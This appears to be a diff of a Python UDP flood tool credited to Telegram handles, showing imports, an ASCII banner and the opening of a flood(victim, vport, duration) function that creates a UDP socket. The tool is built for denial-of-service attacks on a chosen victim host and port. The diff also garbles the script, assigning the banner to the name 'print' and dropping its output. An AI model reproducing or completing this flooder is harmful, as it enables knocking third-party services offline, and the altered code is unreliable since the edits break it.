@@ -1,11 +1,11 @@
 #coded by @qwadoh & @svchost_link
 
-import os
-os.system("clear")
-import requests, random, datetime, sys, time, argparse, os
-from colorama import Fore, Back, Style
+import time
+import socket
+import random
+import sys
 def usage():
-banner = """
+print = """
  _         _              _      _             
 | |       | |            | |    | |            
 | |  ___  | | ______   __| |  __| |  ___   ___ 
@@ -16,8 +16,6 @@ banner = """
                                           search my channel in tg: @svchost_link     
                                                v 1.0(beta)
 """
-
-print(banner)
 def flood(victim, vport, duration):
     # Создание сервера
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
